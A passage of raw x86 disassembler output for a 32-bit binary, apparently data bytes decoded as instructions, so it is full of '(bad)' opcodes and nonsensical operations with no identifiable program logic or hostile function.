  41bbb9:	mov    bh,0xbd
  41bbbb:	mov    ebp,0x3ec5c5b4
  41bbc0:	add    BYTE PTR [eax],al
  41bbc2:	sbb    eax,0x25252727
  41bbc7:	and    eax,0x2527191d
  41bbcc:	daa    
  41bbcd:	and    eax,0x20271d
  41bbd2:	je     0x41bb99
  41bbd4:	ret    0xa6bc
  41bbd7:	test   eax,0xc25fb0c5
  41bbdc:	mov    esp,0xc2bcbcbc
  41bbe1:	ret    0xc2c2
  41bbe4:	ret    
  41bbe5:	add    BYTE PTR [eax],al
  41bbe7:	inc    eax
  41bbe8:	cmp    BYTE PTR [edi],bh
  41bbea:	inc    eax
  41bbeb:	add    BYTE PTR [edi],cl
  41bbed:	jbe    0x41bbad
  41bbef:	scas   al,BYTE PTR es:[edi]
  41bbf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbf1:	stos   DWORD PTR es:[edi],eax
  41bbf2:	stos   DWORD PTR es:[edi],eax
  41bbf3:	stos   BYTE PTR es:[edi],al
  41bbf4:	stos   DWORD PTR es:[edi],eax
  41bbf5:	stos   DWORD PTR es:[edi],eax
  41bbf6:	xchg   esp,eax
  41bbf7:	mov    ebp,0xb6b6bcbe
  41bbfc:	mov    esi,0x9c5bfab
  41bc01:	add    eax,DWORD PTR [eax]
  41bc03:	sbb    ah,BYTE PTR ds:0x15252527
  41bc09:	sbb    DWORD PTR ds:0x1d1d2525,ebx
  41bc0f:	add    eax,DWORD PTR [ecx]
  41bc11:	xchg   ebp,eax
  41bc12:	lds    esi,FWORD PTR [ecx-0x52564248]
  41bc18:	lds    esp,FWORD PTR [edx+0x76]
  41bc1b:	mov    ebp,0xbbb6b6a9
  41bc20:	mov    esp,0xc5c2b7aa
  41bc25:	add    BYTE PTR [edi],bh
  41bc27:	cmp    BYTE PTR [edx],bh
  41bc29:	inc    eax
  41bc2a:	aas    
  41bc2b:	cmp    BYTE PTR [eax],al
  41bc2d:	and    esp,DWORD PTR [ebp-0x6b585143]
  41bc33:	mov    cl,0xb5
  41bc35:	lods   eax,DWORD PTR ds:[esi]
  41bc36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc37:	rol    dl,0xb3
  41bc3a:	mov    ebp,0xbdbdb5b8
  41bc3f:	mov    al,0x2d
  41bc41:	xchg   esi,eax
  41bc42:	add    eax,DWORD PTR [edx]
  41bc44:	and    eax,0x1d251d1d
  41bc49:	sbb    DWORD PTR [edx],edx
  41bc4b:	adc    cl,BYTE PTR ds:0x95170024
  41bc51:	(bad)
  41bc54:	mov    bh,0xbc
  41bc56:	mov    esp,0xa404a4bf
  41bc5b:	les    esp,FWORD PTR [esi-0x54524a4c]
  41bc61:	lods   eax,DWORD PTR ds:[esi]
  41bc62:	mov    bh,0xc5
  41bc64:	add    al,BYTE PTR [eax]
  41bc66:	cmp    bh,BYTE PTR [eax]
  41bc68:	xor    DWORD PTR [edi],edi
  41bc6a:	inc    eax
  41bc6b:	cmp    ch,BYTE PTR [ecx]
  41bc6d:	or     DWORD PTR [edi-0x6b59463c],esp
  41bc73:	mov    ds:0x758bbcb2,eax
  41bc78:	mov    edi,0xb2b2b5b2
  41bc7d:	mov    eax,0xc596bdbd
  41bc82:	rol    DWORD PTR [ecx],0x2f
  41bc85:	sbb    DWORD PTR ds:0x19151d,ebx
  41bc8b:	adc    eax,0xc3956226
  41bc90:	(bad)
  41bc93:	mov    ebp,0xc5aab3bf
  41bc98:	ss add al,0xb0
  41bc9b:	mov    ebp,0xbdb8b7b7
  41bca0:	mov    esp,0xc1bcb6
  41bca5:	add    DWORD PTR [eax],edi
  41bca7:	cmp    BYTE PTR [edx],bh
  41bca9:	aas    
  41bcaa:	inc    eax
  41bcab:	aas    
  41bcac:	inc    eax
  41bcad:	add    al,0x7d
  41bcaf:	les    edi,FWORD PTR [esi-0x504e6b6c]
  41bcb5:	mov    dl,0xbe
  41bcb7:	mov    es,eax
  41bcb9:	mov    edi,0xb8bdb8bd
  41bcbe:	mov    ch,0xb7
  41bcc0:	mov    eax,0x8cc5bf
  41bcc5:	sbb    bl,BYTE PTR ds:0x215151d
  41bccb:	cdq    
  41bccc:	(bad)
  41bccf:	ret    0xbdbc
  41bcd2:	stos   DWORD PTR es:[edi],eax
  41bcd3:	mov    ebp,0xc0bcbbc2
  41bcd8:	sbb    DWORD PTR [edx],ebp
  41bcda:	rol    al,0xb2
  41bcdd:	mov    ds:0xb7bcc2b8,eax
  41bce2:	mov    esp,0x3a13028e
  41bce7:	cmp    BYTE PTR [eax],bh
  41bce9:	cmp    BYTE PTR [eax],bh
  41bceb:	cmp    BYTE PTR [edx],bh
  41bced:	add    ch,BYTE PTR [eax-0x3c]
  41bcf0:	mov    dh,0xa7
  41bcf2:	mov    ds:0x92ab92b1,eax
  41bcf7:	dec    edx
  41bcf8:	dec    edx
  41bcf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcfa:	les    edi,FWORD PTR [eax-0x484d4a4b]
  41bd00:	mov    ds:0x3bc5c594,eax
  41bd05:	add    BYTE PTR ds:0x151515,bl
  41bd0b:	xchg   ecx,eax
  41bd0c:	(bad)
  41bd0f:	mov    ebp,0xb6b1a3b3
  41bd14:	mov    ebp,0x6a75b4a6
  41bd19:	popa   
  41bd1a:	mov    edi,0xb1a7afa3
  41bd1f:	mov    ch,0xbe
  41bd21:	mov    dl,0xc4
  41bd23:	jne    0x41bd25
  41bd25:	sbb    dh,BYTE PTR [ecx]
  41bd27:	cmp    bh,BYTE PTR [edi]
  41bd29:	cmp    BYTE PTR [edx],bh
  41bd2b:	xor    DWORD PTR [eax],edi
  41bd2d:	add    BYTE PTR [ecx],al
  41bd2f:	mov    edi,0x928e9292
  41bd34:	mov    ss,WORD PTR [edi+ecx*4+0x75000100]
  41bd3b:	mov    edi,0xb1b2b1b7
  41bd40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd41:	xchg   ebx,eax
  41bd42:	stos   DWORD PTR es:[edi],eax
  41bd43:	ret    
  41bd44:	popa   
  41bd45:	add    BYTE PTR ds:0x2121515,bl
  41bd4b:	jno    0x41bd12
  41bd4d:	mov    bl,0xb1
  41bd4f:	ret    0x94bc
  41bd52:	lea    ebp,[ecx+0x3eb8abbb]
  41bd58:	inc    edx
  41bd59:	pop    ecx
  41bd5a:	scas   eax,DWORD PTR es:[edi]
  41bd5b:	xchg   ebx,eax
  41bd5c:	xchg   esi,eax
  41bd5d:	mov    edx,0xbfb794b5
  41bd62:	scas   eax,DWORD PTR es:[edi]
  41bd63:	add    BYTE PTR [eax],al
  41bd65:	adc    eax,0x3a3a382f
  41bd6a:	aas    
  41bd6b:	cmp    BYTE PTR [eax],bh
  41bd6d:	add    BYTE PTR [edx],al
  41bd6f:	jg     0x41bdda
  41bd71:	popa   
  41bd72:	popa   
  41bd73:	jno    0x41bde9
  41bd75:	stos   DWORD PTR es:[edi],eax
  41bd76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd77:	add    BYTE PTR ds:0xb7750002,dh
  41bd7d:	xchg   ebx,eax
  41bd7e:	scas   eax,DWORD PTR es:[edi]
  41bd7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd80:	nop
  41bd81:	lea    edx,[eax+ebp*4+0x150804c5]
  41bd88:	adc    dl,BYTE PTR [edx]
  41bd8a:	add    cl,BYTE PTR [eax-0x51]
  41bd8d:	mov    ds:0x9494ab8d,eax
  41bd92:	nop
  41bd93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd94:	stos   DWORD PTR es:[edi],eax
  41bd95:	mov    esi,0x20001a8
  41bd9a:	add    BYTE PTR ds:0xadbca016,cl
  41bda0:	scas   eax,DWORD PTR es:[edi]
  41bda1:	mov    ?,WORD PTR [ebp+0x0]
  41bda4:	add    eax,0x382f311a
  41bda9:	cmp    BYTE PTR [eax],bh
  41bdab:	cmp    BYTE PTR [ecx],dh
  41bdad:	or     DWORD PTR [edx],eax
  41bdaf:	push   esi
  41bdb0:	pop    esi
  41bdb1:	inc    ebp
  41bdb2:	inc    ebp
  41bdb3:	push   edi
  41bdb4:	mov    ss,WORD PTR [eax+eax*1+0xf2f2702]
  41bdbb:	add    ah,BYTE PTR [ebx-0x7e6b6c6d]
  41bdc1:	lea    ecx,[eax+0x1bf8b]
  41bdc7:	adc    eax,0x58000b15
  41bdcc:	mov    edi,0x92abaaa3
  41bdd1:	lea    edx,[eax+0x567aac]
  41bdd7:	cmp    BYTE PTR ds:0xe2f2727,ah
  41bddd:	mov    al,ds:0x7f5d89a8
  41bde2:	mov    eax,0x311900a3
  41bde7:	das    
  41bde8:	das    
  41bde9:	daa    
  41bdea:	daa    
  41bdeb:	das    
  41bdec:	das    
  41bded:	or     DWORD PTR [eax],eax
  41bdef:	xchg   ecx,eax
  41bdf0:	pop    ebp
  41bdf1:	pop    ecx
  41bdf2:	dec    eax
  41bdf3:	xor    eax,0xa883
  41bdf8:	daa    
  41bdf9:	and    eax,0xbe000527
  41bdfe:	test   al,0x81
  41be00:	xor    DWORD PTR [eax-0x80],0xffffff9b
  41be04:	scas   al,BYTE PTR es:[edi]
  41be05:	lds    eax,FWORD PTR [eax]
  41be07:	adc    edx,DWORD PTR [edx]
  41be09:	adc    al,BYTE PTR [eax]
  41be0b:	push   esi
  41be0c:	mov    edx,0x96beadb4
  41be11:	xchg   ebx,eax
  41be12:	sub    DWORD PTR [esi+0x1d00005d],0x1d
  41be19:	daa    
  41be1a:	and    eax,0x5c001d
  41be1f:	add    eax,0x8b8ba180
  41be24:	add    BYTE PTR [edi+eiz*1],cl
  41be27:	and    eax,0x2f2f2727
  41be2c:	das    
  41be2d:	or     DWORD PTR [eax],eax
  41be2f:	adc    DWORD PTR [ecx+ebp*2+0x61],0x72
  41be34:	lea    ebp,[eax+0x251d007a]
  41be3a:	sbb    eax,0xac00001d
  41be3f:	mov    ecx,DWORD PTR [eax-0x57768297]
  41be45:	test   al,0x12
  41be47:	or     DWORD PTR [edx],edx
  41be49:	adc    al,BYTE PTR [edx]
  41be4b:	das    
  41be4c:	test   al,0xac
  41be4e:	mov    ebp,DWORD PTR [eax+ebp*4+0x5cac9093]
  41be55:	add    BYTE PTR ds:0x1d251d1d,ah
  41be5b:	sbb    al,BYTE PTR [eax]
  41be5d:	add    cl,BYTE PTR [ecx]
  41be5f:	add    DWORD PTR [edx+0x28a907f],0x0
  41be66:	das    
  41be67:	daa    
  41be68:	and    eax,0x27272f25
  41be6d:	or     DWORD PTR [edx],eax
  41be6f:	jg     0x41bece
  41be71:	popa   
  41be72:	pop    esi
  41be73:	pop    ecx
  41be74:	adc    DWORD PTR [ebx+0x1d25027d],0x1d
  41be7b:	sbb    eax,0xa1ae020e
  41be80:	xor    BYTE PTR [eax+0x57],0x6d
  41be84:	mov    edi,DWORD PTR [ecx+0x120b003d]
  41be8a:	add    BYTE PTR [edi],cl
  41be8c:	fwait
  41be8d:	lahf   
  41be8e:	mov    edx,DWORD PTR [edx-0x5d5e6f51]
  41be94:	pop    edx
  41be95:	or     BYTE PTR ds:0x191d191d,bl
  41be9b:	sbb    eax,0x6fa15502
  41bea0:	cmp    BYTE PTR [edi-0x7f],0x83
  41bea4:	call   0x2f2f:0x2f270001
  41beab:	daa    
  41beac:	daa    
  41bead:	adc    al,BYTE PTR [eax]
  41beaf:	fwait
  41beb0:	ins    DWORD PTR es:[edi],dx
  41beb1:	popa   
  41beb2:	popa   
  41beb3:	jno    0x41be43
  41beb5:	xchg   ecx,eax
  41beb6:	imul   eax,DWORD PTR [eax],0x1d1d1d1d
  41bebc:	sbb    eax,0x80889400
  41bec1:	jo     0x41bf19
  41bec3:	pop    esi
  41bec4:	cmp    BYTE PTR [ecx+0x9120261],0x0
  41becb:	add    al,0x80
  41becd:	sahf   
  41bece:	xchg   edi,eax
  41becf:	jp     0x41be64
  41bed1:	mov    es,WORD PTR [ecx+0x19093d9f]
  41bed7:	sbb    cl,BYTE PTR [ebx]
  41bed9:	or     ecx,DWORD PTR [edx+ecx*1]
  41bedc:	add    BYTE PTR [esi+0x71748291],al
  41bee2:	adc    DWORD PTR [ecx+0x250279a1],0x25
  41bee9:	and    eax,0x1d27251d
  41beee:	add    BYTE PTR [ebp-0x68],bl
  41bef1:	jge    0x41bf72
  41bef3:	jo     0x41bf66
  41bef5:	and    DWORD PTR [edi+0x0],0x1d
  41bef9:	sbb    eax,0x19151d
  41befe:	mov    ds,WORD PTR [ebx+0x70617f80]
  41bf04:	sub    DWORD PTR [eax+0xb0b0071],ebp
  41bf0a:	add    BYTE PTR [edx],al
  41bf0c:	jns    0x41be94
  41bf0e:	ins    DWORD PTR es:[edi],dx
  41bf0f:	xchg   edi,eax
  41bf10:	ins    DWORD PTR es:[edi],dx
  41bf11:	jb     0x41bf85
  41bf13:	fwait
  41bf14:	or     al,0x15
  41bf16:	sbb    DWORD PTR [ecx],ebx
  41bf18:	add    BYTE PTR [ecx],cl
  41bf1a:	or     DWORD PTR [eax+eax*1],eax
  41bf1d:	jp     0x41bea0
  41bf1f:	outs   dx,DWORD PTR ds:[esi]
  41bf20:	jb     0x41bf95
  41bf22:	jg     0x41beb5
  41bf24:	mov    eax,ds:0x25250086
  41bf29:	and    eax,0x1925251d
  41bf2e:	and    eax,0x819d6d07
  41bf33:	mov    BYTE PTR [ecx+0x19008480],al
  41bf39:	sbb    eax,0x15191d
  41bf3e:	inc    ebx
  41bf3f:	imul   edx,DWORD PTR [eax+0x6e],0x83466d45
  41bf46:	mov    BYTE PTR [eax],al
  41bf48:	or     ecx,DWORD PTR [ebx]
  41bf4a:	add    BYTE PTR ds:0x7c7f8586,cl
  41bf50:	test   DWORD PTR [edx+0x61],ebp
  41bf53:	add    DWORD PTR [eax],0x1e1d1215
  41bf59:	cwde   
  41bf5a:	call   0x7272:0x7e8a8a89
  41bf61:	jb     0x41bfe2
  41bf63:	or     DWORD PTR [ebx+0x27270097],0x25
  41bf6a:	daa    
  41bf6b:	and    eax,0xc000b25
  41bf70:	add    BYTE PTR [ecx-0x75],ch
  41bf73:	jno    0x41bfe6
  41bf75:	jp     0x41befb
  41bf77:	add    BYTE PTR [ecx],bl
  41bf79:	sbb    DWORD PTR ds:0x2001519,ebx
  41bf7f:	pop    ebp
  41bf80:	add    BYTE PTR [ecx-0x7de8bb92],0x9b
  41bf87:	add    BYTE PTR [ebx],cl
  41bf89:	or     eax,DWORD PTR [eax]
  41bf8b:	add    BYTE PTR [edi-0x7d7c7477],dl
  41bf91:	jl     0x41c012
  41bf93:	mov    DWORD PTR [ecx],ecx
  41bf95:	sbb    DWORD PTR ds:0xa89d1419,edx
  41bf9b:	xchg   ebp,eax
  41bf9c:	gs pusha 
  41bf9e:	push   0x6a
  41bfa0:	jb     0x41c015
  41bfa2:	mov    BYTE PTR [eax-0x7f],dh
  41bfa5:	xchg   BYTE PTR [ecx],al
  41bfa7:	sbb    eax,0x1d251d1d
  41bfac:	sbb    eax,0x859a0a04
  41bfb1:	xor    BYTE PTR [eax],ch
  41bfb3:	test   DWORD PTR [ecx+0x5d],esi
  41bfb6:	test   BYTE PTR [edx],al
  41bfb8:	adc    eax,0x12191915
  41bfbd:	add    al,BYTE PTR [edx+ebx*4]
  41bfc0:	jg     0x41bf4a
  41bfc2:	jle    0x41c022
  41bfc4:	dec    ecx
  41bfc5:	sbb    DWORD PTR [edx+0x2090901],0x918a8600
  41bfcf:	add    DWORD PTR [ebx+0x12986c65],0x15
  41bfd6:	adc    eax,0xa1260215
  41bfdb:	jg     0x41bff4
  41bfdd:	cs pusha 
  41bfdf:	pop    esi
  41bfe0:	data16 data16 ins BYTE PTR es:[edi],dx
  41bfe3:	jge    0x41c064
  41bfe5:	call   0x1d1d:0x1d1d1d00
  41bfec:	sbb    eax,0xa29d0c04
  41bff1:	mov    ds:0x97861969,al
  41bff6:	test   BYTE PTR [eax],al
  41bff8:	adc    eax,0x15191919
  41bffd:	add    BYTE PTR [ebx],bl
  41bfff:	test   DWORD PTR [ecx+0x7f],ebp
  41c002:	jnp    0x41c05a
  41c004:	inc    esi
  41c005:	jl     0x41bf90
  41c007:	add    BYTE PTR [ecx],cl
  41c009:	or     DWORD PTR [eax],eax
  41c00b:	sub    al,0x6b
  41c00d:	jge    0x41bf9f
  41c00f:	add    BYTE PTR [edx+0xf9b6072],0x15
  41c016:	adc    dl,BYTE PTR [edx]
  41c018:	adc    al,BYTE PTR [edx]
  41c01a:	sbb    ebx,DWORD PTR [edx+0x6a374b58]
  41c020:	jnp    0x41c085
  41c022:	pop    eax
  41c023:	push   0x69
  41c025:	test   DWORD PTR [eax],eax
  41c027:	sbb    DWORD PTR ds:0x191d191d,ebx
  41c02d:	add    al,0x9
  41c02f:	fwait
  41c030:	jno    0x41c078
  41c032:	jo     0x41bfb4
  41c034:	cmp    ebx,DWORD PTR [esp+ebx*4+0x15121500]
  41c03b:	adc    eax,0x68140015
  41c040:	pop    edi
  41c041:	jnp    0x41c0b1
  41c043:	pop    esi
  41c044:	dec    eax
  41c045:	outs   dx,BYTE PTR ds:[esi]
  41c046:	pushf  
  41c047:	add    BYTE PTR [ecx],cl
  41c049:	or     DWORD PTR [eax],eax
  41c04b:	inc    ebx
  41c04c:	addr16 popa 
  41c04e:	add    DWORD PTR [edx-0x7a91837e],0x6
  41c055:	adc    dl,BYTE PTR [edx]
  41c057:	adc    dl,BYTE PTR [edx]
  41c059:	adc    al,BYTE PTR [eax]
  41c05b:	adc    edx,DWORD PTR [edi+0x7c]
  41c05e:	outs   dx,BYTE PTR ds:[esi]
  41c05f:	outs   dx,DWORD PTR ds:[esi]
  41c060:	jnp    0x41c0cc
  41c062:	gs jb  0x41bfea
  41c065:	xchg   edi,eax
  41c066:	add    BYTE PTR [ecx],bl
  41c068:	sbb    DWORD PTR ds:0x4191d19,edx
  41c06e:	push   ds
  41c06f:	popf   
  41c070:	popa   
  41c071:	dec    eax
  41c072:	and    ebx,DWORD PTR [eax+0x50]
  41c075:	and    eax,0x12150002
  41c07a:	adc    eax,0x5001215
  41c07f:	inc    ebp
  41c080:	push   esi
  41c081:	pop    eax
  41c082:	pop    esi
  41c083:	inc    esp
  41c084:	outs   dx,BYTE PTR ds:[si]
  41c086:	lahf   
  41c087:	add    BYTE PTR [ecx],cl
  41c089:	or     DWORD PTR [eax],eax
  41c08b:	inc    ecx
  41c08c:	test   BYTE PTR [edi-0x7d],bh
  41c08f:	xor    DWORD PTR [edx+ebp*2+0x68],0x68
  41c094:	add    dl,BYTE PTR ds:0xb120b12
  41c09a:	or     al,0x1
  41c09c:	cmovne ebx,DWORD PTR [eax-0x63606769]
  41c0a3:	sahf   
  41c0a4:	sahf   
  41c0a5:	cwde   
  41c0a6:	add    dl,BYTE PTR ds:0x19191519
  41c0ac:	adc    eax,0x709f0002
  41c0b1:	inc    ebp
  41c0b2:	inc    ebp
  41c0b3:	cs dec eax
  41c0b5:	dec    esi
  41c0b6:	add    BYTE PTR [edx],al
  41c0b8:	adc    cl,BYTE PTR [ebx]
  41c0ba:	adc    dl,BYTE PTR [edx]
  41c0bc:	or     eax,DWORD PTR [edx]
  41c0be:	add    al,0x57
  41c0c0:	inc    esp
  41c0c1:	sub    eax,0x9f671f36
  41c0c6:	lahf   
  41c0c7:	add    BYTE PTR [ecx],cl
  41c0c9:	or     DWORD PTR [eax],eax
  41c0cb:	cmp    eax,DWORD PTR [ecx+eiz*2+0x73838383]
  41c0d2:	xchg   BYTE PTR [edx+0x5],bh
  41c0d5:	sbb    eax,0xb0b0b0b
  41c0da:	or     ecx,DWORD PTR [ebx]
  41c0dc:	adc    eax,0x5a5a5138
  41c0e1:	or     cl,BYTE PTR [ecx]
  41c0e3:	adc    ah,BYTE PTR [esi]
  41c0e5:	or     eax,DWORD PTR [edx]
  41c0e7:	adc    eax,0x15191515
  41c0ec:	adc    eax,0x6d9f0000
  41c0f1:	ds ss cs pop eax
  41c0f5:	push   esp
  41c0f6:	add    al,0x0
  41c0f8:	adc    dl,BYTE PTR [edx]
  41c0fa:	or     edx,DWORD PTR [edx]
  41c0fc:	or     eax,DWORD PTR [eax]
  41c0fe:	add    al,BYTE PTR [eax+ecx*2+0x46]
  41c102:	ss ss push edx
  41c105:	lahf   
  41c106:	lahf   
  41c107:	add    BYTE PTR [ecx],cl
  41c109:	or     DWORD PTR [eax],eax
  41c10b:	inc    esp
  41c10c:	test   BYTE PTR [ecx+0x74],bl
  41c10f:	jno    0x41c185
  41c111:	pop    ecx
  41c112:	outs   dx,DWORD PTR ds:[esi]
  41c113:	sahf   
  41c114:	sbb    al,0x2
  41c116:	or     ecx,DWORD PTR [ebx]
  41c118:	or     ecx,DWORD PTR [ebx]
  41c11a:	or     edx,DWORD PTR [edx]
  41c11c:	adc    dl,BYTE PTR [edx]
  41c11e:	adc    dl,BYTE PTR [edx]
  41c120:	or     edx,DWORD PTR [edx]
  41c122:	adc    dl,BYTE PTR [edx]
  41c124:	adc    dl,BYTE PTR ds:0x12121213
  41c12a:	adc    eax,0x2041215
  41c12f:	call   0x5445:0x452d547d
  41c136:	cmp    eax,DWORD PTR [edx]
  41c138:	adc    cl,BYTE PTR [ebx]
  41c13a:	or     ecx,DWORD PTR [ebx]
  41c13c:	or     eax,DWORD PTR [eax]
  41c13e:	push   eax
  41c13f:	push   edi
  41c140:	dec    ecx
  41c141:	dec    ecx
  41c142:	dec    ecx
  41c143:	gs ds call 0x5d00:0x409009f
  41c14c:	jns    0x41c197
  41c14e:	pop    ecx
  41c14f:	popa   
  41c150:	sub    BYTE PTR [esi+0x46],0x9f
  41c154:	jp     0x41c158
  41c156:	or     ecx,DWORD PTR [ebx]
  41c158:	or     DWORD PTR [ebx],ecx
  41c15a:	or     ecx,DWORD PTR [ebx]
  41c15c:	or     edx,DWORD PTR [edx]
  41c15e:	adc    dl,BYTE PTR [edx]
  41c160:	adc    dl,BYTE PTR [edx]
  41c162:	adc    dl,BYTE PTR [edx]
  41c164:	or     edx,DWORD PTR [edx]
  41c166:	adc    dl,BYTE PTR [edx]
  41c168:	or     edx,DWORD PTR [edx]
  41c16a:	adc    dl,BYTE PTR [edx]
  41c16c:	adc    al,BYTE PTR [eax]
  41c16e:	add    dl,BYTE PTR [edi+0x2e45525c]
  41c174:	inc    edi
  41c175:	pop    ebp
  41c176:	pop    ebp
  41c177:	add    BYTE PTR [edx],dl
  41c179:	or     ecx,DWORD PTR [ecx]
  41c17b:	or     DWORD PTR [ecx],ecx
  41c17d:	add    BYTE PTR [edx+0x65],bh
  41c180:	jb     0x41c1e5
  41c182:	arpl   WORD PTR [edi-0x74],bp
  41c185:	xor    ecx,DWORD PTR [eax+eax*1]
  41c188:	or     DWORD PTR [eax+eax*1],eax
  41c18b:	pop    esp
  41c18c:	imul   ecx,DWORD PTR [ebx+0x37],0x46
  41c190:	cmp    BYTE PTR [edi-0x75],0x7a
  41c194:	push   0xb090f00
  41c199:	or     DWORD PTR [ecx],ecx
  41c19b:	or     DWORD PTR [ebx],ecx
  41c19d:	adc    cl,BYTE PTR [ebx]
  41c19f:	adc    dl,BYTE PTR [edx]
  41c1a1:	adc    dl,BYTE PTR [edx]
  41c1a3:	or     ecx,DWORD PTR [ecx]
  41c1a5:	or     DWORD PTR [ecx],ecx
  41c1a7:	or     ecx,DWORD PTR [ebx]
  41c1a9:	adc    cl,BYTE PTR [ebx]
  41c1ab:	adc    cl,BYTE PTR [ebx]
  41c1ad:	add    BYTE PTR [eax],al
  41c1af:	mov    DWORD PTR [esi],esp
  41c1b1:	push   esp
  41c1b2:	push   esi
  41c1b3:	dec    eax
  41c1b4:	xor    eax,0x900696d
  41c1b9:	or     DWORD PTR [ecx],ecx
  41c1bb:	or     DWORD PTR [ecx],ecx
  41c1bd:	add    ch,BYTE PTR [eax+0x66]
  41c1c0:	jb     0x41c226
  41c1c2:	aaa    
  41c1c3:	outs   dx,DWORD PTR ds:[esi]
  41c1c5:	mov    ecx,DWORD PTR [edx+eax*1]
  41c1c8:	add    al,0x4
  41c1ca:	add    BYTE PTR [ebx+0x68],bl
  41c1cd:	and    al,0x37
  41c1cf:	inc    esi
  41c1d0:	sub    DWORD PTR [esi+0x67],0x1d5b
  41c1d7:	or     DWORD PTR [ecx],ecx
  41c1d9:	or     ecx,DWORD PTR [ebx]
  41c1db:	or     ecx,DWORD PTR [ebx]
  41c1dd:	or     ecx,DWORD PTR [ebx]
  41c1df:	or     ecx,DWORD PTR [ebx]
  41c1e1:	or     ecx,DWORD PTR [ebx]
  41c1e3:	add    BYTE PTR [eax],al
  41c1e5:	add    BYTE PTR [eax],al
  41c1e7:	adc    cl,BYTE PTR [ebx]
  41c1e9:	adc    cl,BYTE PTR [ebx]
  41c1eb:	or     edx,DWORD PTR [edx]
  41c1ed:	add    BYTE PTR [edx],al
  41c1ef:	jge    0x41c1fe
  41c1f1:	inc    esp
  41c1f2:	pop    ecx
  41c1f3:	inc    edi
  41c1f4:	inc    esp
  41c1f5:	outs   dx,BYTE PTR ds:[esi]
  41c1f6:	push   0x9090b02
  41c1fb:	push   es
  41c1fc:	add    al,BYTE PTR [eax]
  41c1fe:	push   0x37633749
  41c203:	and    ch,BYTE PTR [esi-0x63]
  41c206:	push   ss
  41c207:	push   es
  41c208:	or     DWORD PTR [eax+eax*1],eax
  41c20b:	dec    esi
  41c20c:	push   0x37
  41c20e:	aaa    
  41c20f:	inc    esi
  41c210:	add    BYTE PTR [esi+0x4],0x97
  41c214:	add    BYTE PTR [bp+si],al
  41c217:	add    BYTE PTR [ecx],cl
  41c219:	or     DWORD PTR [ebx],ecx
  41c21b:	or     DWORD PTR [ecx],ecx
  41c21d:	or     ecx,DWORD PTR [ebx]
  41c21f:	or     ecx,DWORD PTR [ebx]
  41c221:	or     eax,0x25d0000
  41c226:	add    BYTE PTR [ebx],cl
  41c228:	or     edx,DWORD PTR [edx]
  41c22a:	or     edx,DWORD PTR [edx]
  41c22c:	or     eax,DWORD PTR [edx]
  41c22e:	add    BYTE PTR [edi+eax*1+0x46344734],al
  41c235:	sub    BYTE PTR [ebp+0x4],0x9
  41c239:	or     DWORD PTR [ebx],eax
  41c23b:	add    dh,BYTE PTR [edx]
  41c23d:	test   DWORD PTR [eax+0x2449626a],eax
  41c243:	and    al,BYTE PTR [edi+0x409029a]
  41c249:	add    al,0x8
  41c24b:	inc    ecx
  41c24c:	pop    esi
  41c24d:	aaa    
  41c24e:	dec    ecx
  41c24f:	aaa    
  41c250:	push   0x2500793c
  41c255:	pushf  
  41c256:	add    BYTE PTR [edx],al
  41c258:	add    BYTE PTR [ecx],cl
  41c25a:	or     DWORD PTR [ecx],ecx
  41c25c:	or     DWORD PTR [ecx],ecx
  41c25e:	or     DWORD PTR [ebx],ecx
  41c260:	add    BYTE PTR [edx],al
  41c262:	add    BYTE PTR [edx-0x7b],bh
  41c265:	aas    
  41c266:	add    cl,BYTE PTR [ecx]
  41c268:	or     DWORD PTR [ebx],ecx
  41c26a:	or     ecx,DWORD PTR [ecx]
  41c26c:	or     DWORD PTR [eax],eax
  41c26e:	add    BYTE PTR [esi+0x4630485d],bl
  41c274:	gs fwait
  41c276:	addr16 add al,0x0
  41c279:	add    BYTE PTR [eax],al
  41c27b:	ins    DWORD PTR es:[edi],dx
  41c27c:	popf   
  41c27d:	xchg   DWORD PTR [esi+0x46],edi
  41c280:	outs   dx,BYTE PTR ds:[esi]
  41c281:	outs   dx,DWORD PTR ds:[esi]
  41c282:	and    al,0x37
  41c284:	mov    bl,BYTE PTR [ebx+0x3]
  41c287:	add    al,0x4
  41c289:	add    al,0x4
  41c28b:	sbb    DWORD PTR [edi+0x37],ebx
  41c28e:	and    al,0x65
  41c290:	xchg   BYTE PTR [ebx+0x2],bl
  41c293:	add    DWORD PTR [eax+edi*2+0x13c6b],ebx
  41c29a:	add    al,BYTE PTR [edx]
  41c29c:	add    BYTE PTR [edx+eax*1],al
  41c29f:	add    BYTE PTR [eax],al
  41c2a1:	push   ebp
  41c2a2:	jg     0x41c2da
  41c2a4:	jge    0x41c31f
  41c2a6:	add    BYTE PTR [ecx],cl
  41c2a8:	or     ecx,DWORD PTR [ebx]
  41c2aa:	or     ecx,DWORD PTR [ecx]
  41c2ac:	or     eax,DWORD PTR [eax]
  41c2ae:	add    BYTE PTR [eax+0x62596984],bl
  41c2b4:	jno    0x41c24e
  41c2b6:	and    DWORD PTR [esi+edx*1],ebp
  41c2b9:	or     cl,BYTE PTR [esi+eax*4+0x59]
  41c2bd:	gs dec ecx
  41c2bf:	bound  ebx,QWORD PTR [eax+0x5e]
  41c2c2:	push   0x7c
  41c2c4:	cwde   
  41c2c5:	or     eax,DWORD PTR [edx]
  41c2c7:	add    al,0x4
  41c2c9:	add    BYTE PTR [eax+ecx*1],al
  41c2cc:	pop    esp
  41c2cd:	outs   dx,BYTE PTR ds:[esi]
  41c2ce:	outs   dx,DWORD PTR ds:[esi]
  41c2cf:	addr16 pop ebx
  41c2d1:	add    BYTE PTR [edx],al
  41c2d3:	mov    BYTE PTR [esi+0x4b],ah
  41c2d6:	outs   dx,DWORD PTR ds:[esi]
  41c2d7:	js     0x41c348
  41c2d9:	jnp    0x41c32b
  41c2db:	inc    ebx
  41c2dc:	push   edi
  41c2dd:	pop    esi
  41c2de:	push   0x7e7d7c67
  41c2e3:	inc    esp
  41c2e4:	jp     0x41c26b
  41c2e6:	add    BYTE PTR [esp+eax*1],al
  41c2e9:	add    al,0x4
  41c2eb:	add    al,0x4
  41c2ed:	add    al,BYTE PTR [eax]
  41c2ef:	test   DWORD PTR [esi+0x5e],edx
  41c2f2:	dec    ecx
  41c2f3:	bound  ecx,QWORD PTR [ecx+0x6a594757]
